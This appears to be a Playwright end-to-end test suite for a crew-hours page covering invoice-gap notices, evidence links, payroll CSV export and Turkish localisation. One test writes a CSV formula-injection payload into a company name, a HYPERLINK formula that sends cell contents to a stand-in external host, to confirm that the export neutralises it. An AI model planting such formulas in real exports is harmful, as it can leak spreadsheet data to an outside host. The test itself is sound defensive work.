import { readFile } from 'node:fs/promises';
import { expect, test, type Page } from '@playwright/test';
import { admin, pinSeedClock, SEED, signInWithMagicLink } from './support';

/**
 * W3-06 · Crew hours on v1.2 against the real stack (spec F19, P8, §13 "Invoice gap", §19 Q133):
 * the seeded week shows BrightLine +16 h with its voice-note evidence; an invoice saved with a gap
 * on Northgate's call day posts one `invoice_gap` notice (to ops and accounts, through
 * notification_audience) and cites the call second; the payroll CSV neutralises a formula in a
 * company name; the page reads in Turkish. Everything this spec writes is removed afterwards
 * (the specs share one database). Part of the M9 acceptance suite (W3-18, `pnpm e2e:m9`): tagged
 * `@m9 @F19`.
 */
test.describe.configure({ mode: 'serial' });

const APEX = 'Apex Concrete';
const NEW_INVOICE = 'AP-1098';

async function cleanup() {
  const db = admin();
  const { data: rows } = await db
    .from('sub_invoices')
    .select('id')
    .eq('org_id', SEED.orgId)
    .eq('invoice_no', NEW_INVOICE);
  const ids = (rows ?? []).map((r: { id: string }) => r.id);
  if (ids.length) {
    await db.from('audit_log').delete().in('entity_id', ids);
    await db.from('sub_invoices').delete().in('id', ids);
  }
  await db
    .from('notifications')
    .delete()
    .eq('org_id', SEED.orgId)
    .eq('kind', 'invoice_gap')
    .eq('data->params->>invoiceNo', NEW_INVOICE);
}

test.beforeAll(cleanup);
test.afterAll(cleanup);

test.beforeEach(async ({ page }) => {
  await pinSeedClock(page);
});

async function openRow(page: Page, company: string) {
  // The row toggles its aside; saving an invoice opens that company's already.
  const row = page.getByRole('button', { name: `Compare ${company} with its invoice` });
  if ((await row.getAttribute('aria-pressed')) !== 'true') await row.click();
  const aside = page.getByTestId('invoice-check');
  await expect(aside).toContainText(company);
  return aside;
}

test(
  'the seeded week: BrightLine +16 h with its voice-note evidence',
  { tag: ['@m9', '@F19'] },
  async ({ page }) => {
    await signInWithMagicLink(page);
    await page.goto('/hours?week=2026-W41');
    await expect(page.getByTestId('hours-matrix')).toBeVisible();
    await expect(
      page.locator('[data-company="BrightLine Electric"] [data-testid="gap-cell"]'),
    ).toHaveText('+16 h');
    const aside = await openRow(page, 'BrightLine Electric');
    await expect(aside.getByTestId('invoice-total-gap')).toHaveText('+16');
    const hero = aside.getByRole('link', {
      name: `Open report ${SEED.heroReport.no} at audio 0:19`,
    });
    await expect(hero).toHaveAttribute(
      'href',
      new RegExp(`^/reports/${SEED.heroReport.id}\\?clip=[^&]+&at=19$`),
    );
    await expect(aside.getByTestId('invoice-evidence')).toContainText('five electricians');
  },
);

test(
  'an invoice saved with a gap posts one notice and cites Northgate’s call',
  { tag: ['@m9', '@F19'] },
  async ({ page }) => {
    await signInWithMagicLink(page);
    await page.goto('/hours?week=2026-W41');
    await expect(page.getByTestId('hours-matrix')).toBeVisible();

    await page.getByRole('button', { name: 'Add invoice' }).click();
    const dialog = page.getByRole('dialog');
    await dialog.getByRole('combobox', { name: 'Company' }).click();
    await page.getByRole('option', { name: APEX }).click();
    await expect(dialog.getByLabel('Fri')).toHaveValue('104');
    await dialog.getByLabel('Invoice number').fill(NEW_INVOICE);
    await dialog.getByLabel('Fri').fill('112');
    await dialog.getByRole('button', { name: 'Add invoice' }).click();
    await expect(dialog).toBeHidden();

    const { data: notices, error } = await admin()
      .from('notifications')
      .select('title, body, user_id, target_path, data')
      .eq('org_id', SEED.orgId)
      .eq('kind', 'invoice_gap')
      .eq('data->params->>invoiceNo', NEW_INVOICE);
    expect(error).toBeNull();
    expect(notices).toEqual([
      {
        title: `Invoice gap: ${APEX} +8 h`,
        body: `${NEW_INVOICE} invoices 480 h · reports show 472 h`,
        user_id: null,
        target_path: '/hours?week=2026-W41',
        data: {
          key: 'invoice_gap',
          params: { company: APEX, invoiceNo: NEW_INVOICE, invoiced: 480, reported: 472, gap: 8 },
        },
      },
    ]);

    // Northgate's Friday report came in by call: its Apex line cites the call second.
    await expect(page.locator(`[data-company="${APEX}"] [data-testid="gap-cell"]`)).toHaveText(
      '+8 h',
    );
    const aside = await openRow(page, APEX);
    const call = aside.getByRole('link', {
      name: new RegExp(`^Open report ${SEED.northgateReport.no} at call \\d+:\\d{2}$`),
    });
    await expect(call).toHaveAttribute(
      'href',
      new RegExp(`^/reports/${SEED.northgateReport.id}\\?clip=[^&]+&at=\\d+$`),
    );
    await call.click();
    await expect(page).toHaveURL(new RegExp(`/reports/${SEED.northgateReport.id}\\?clip=`));
  },
);

test(
  'accounts sees the notice; the payroll CSV neutralises a formula name',
  { tag: ['@m9', '@F19'] },
  async ({ page }) => {
    const db = admin();
    const { data: company } = await db
      .from('companies')
      .select('id, name')
      .eq('org_id', SEED.orgId)
      .eq('name', 'ClearView Glazing')
      .single();
    const evil = '=HYPERLINK("https://x.example/?"&A2,"Pay")';
    await db.from('companies').update({ name: evil }).eq('id', company!.id);
    try {
      await signInWithMagicLink(page, SEED.accounts.email, '/hours');
      await page.getByTestId('notifications-bell').click();
      await expect(page.getByRole('list', { name: 'Notifications' })).toContainText(
        `Invoice gap: ${APEX} +8 h`,
      );
      await page.keyboard.press('Escape');

      await page.goto('/hours?week=2026-W41');
      await expect(page.getByTestId('hours-matrix')).toBeVisible();
      const download = page.waitForEvent('download');
      await page.getByRole('button', { name: 'Payroll CSV' }).click();
      const csv = await readFile((await (await download).path())!, 'utf8');
      expect(csv).toContain(`"'=HYPERLINK(""https://x.example/?""&A2,""Pay"")"`);
      expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
    } finally {
      await db.from('companies').update({ name: company!.name }).eq('id', company!.id);
    }
  },
);

test('the page reads in Turkish', { tag: ['@m9', '@F19'] }, async ({ page }) => {
  await page.addInitScript(() =>
    window.localStorage.setItem('sitelog.language', JSON.stringify('tr')),
  );
  await signInWithMagicLink(page);
  await page.goto('/hours?week=2026-W41');
  await expect(page.getByRole('heading', { name: 'Ekip saatleri', level: 1 })).toBeVisible();
  await expect(page.getByTestId('week-label')).toHaveText('5 EKİ – 9 EKİ, 2026');
  await expect(
    page.locator('[data-company="BrightLine Electric"] [data-testid="gap-cell"]'),
  ).toHaveText('+16 sa');
  await expect(page.getByRole('button', { name: 'Bordro CSV' })).toBeVisible();
});
